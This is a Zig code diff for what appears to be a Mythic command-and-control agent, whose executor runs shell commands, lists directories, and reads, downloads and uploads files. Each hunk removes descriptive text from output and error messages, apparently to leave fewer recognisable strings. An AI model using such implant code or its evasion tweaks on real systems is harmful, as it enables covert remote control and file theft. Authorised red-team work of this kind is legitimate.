@@ -33,7 +33,7 @@ pub const CommandExecutor = struct {
         } else {
             return MythicResponse{
                 .task_id = task.id,
-                .user_output = try std.fmt.allocPrint(self.allocator, "Unknown command: {s}", .{task.command}),
+                .user_output = try std.fmt.allocPrint(self.allocator, "{s}", .{task.command}),
                 .completed = true,
                 .status = "error",
             };
@@ -61,7 +61,7 @@ pub const CommandExecutor = struct {
         }) catch |err| {
             return MythicResponse{
                 .task_id = task.id,
-                .user_output = try std.fmt.allocPrint(self.allocator, "Failed to execute shell command: {}", .{err}),
+                .user_output = try std.fmt.allocPrint(self.allocator, "{}", .{err}),
                 .completed = true,
                 .status = "error",
             };
@@ -84,7 +84,7 @@ pub const CommandExecutor = struct {
         const cwd = std.process.getCwdAlloc(self.allocator) catch |err| {
             return MythicResponse{
                 .task_id = task.id,
-                .user_output = try std.fmt.allocPrint(self.allocator, "Failed to get current directory: {}", .{err}),
+                .user_output = try std.fmt.allocPrint(self.allocator, "{}", .{err}),
                 .completed = true,
                 .status = "error",
             };
@@ -111,7 +111,7 @@ pub const CommandExecutor = struct {
         var dir = std.fs.cwd().openDir(path, .{ .iterate = true }) catch |err| {
             return MythicResponse{
                 .task_id = task.id,
-                .user_output = try std.fmt.allocPrint(self.allocator, "Failed to open directory '{s}': {}", .{ path, err }),
+                .user_output = try std.fmt.allocPrint(self.allocator, "{s}: {}", .{ path, err }),
                 .completed = true,
                 .status = "error",
             };
@@ -148,7 +148,7 @@ pub const CommandExecutor = struct {
         const content = std.fs.cwd().readFileAlloc(self.allocator, task.parameters, 1024 * 1024) catch |err| {
             return MythicResponse{
                 .task_id = task.id,
-                .user_output = try std.fmt.allocPrint(self.allocator, "Failed to read file {s}: {}", .{ task.parameters, err }),
+                .user_output = try std.fmt.allocPrint(self.allocator, "{s}: {}", .{ task.parameters, err }),
                 .completed = true,
                 .status = "error",
             };
@@ -166,7 +166,7 @@ pub const CommandExecutor = struct {
         const file_content = std.fs.cwd().readFileAlloc(self.allocator, task.parameters, 10 * 1024 * 1024) catch |err| {
             return MythicResponse{
                 .task_id = task.id,
-                .user_output = try std.fmt.allocPrint(self.allocator, "Failed to read file for download: {}", .{err}),
+                .user_output = try std.fmt.allocPrint(self.allocator, "{}", .{err}),
                 .completed = true,
                 .status = "error",
             };
@@ -180,7 +180,7 @@ pub const CommandExecutor = struct {
         
         return MythicResponse{
             .task_id = task.id,
-            .user_output = try std.fmt.allocPrint(self.allocator, "File downloaded: {s} ({d} bytes)", .{ task.parameters, file_content.len }),
+            .user_output = try std.fmt.allocPrint(self.allocator, "{s} ({d} bytes)", .{ task.parameters, file_content.len }),
             .completed = true,
             .status = "completed",
             .artifacts = encoded_content,
@@ -219,7 +219,7 @@ pub const CommandExecutor = struct {
         
         return MythicResponse{
             .task_id = task.id,
-            .user_output = try std.fmt.allocPrint(self.allocator, "File uploaded: {s} ({d} bytes)", .{ filename, decoded_content.len }),
+            .user_output = try std.fmt.allocPrint(self.allocator, "{s} ({d} bytes)", .{ filename, decoded_content.len }),
             .completed = true,
             .status = "completed",
         };
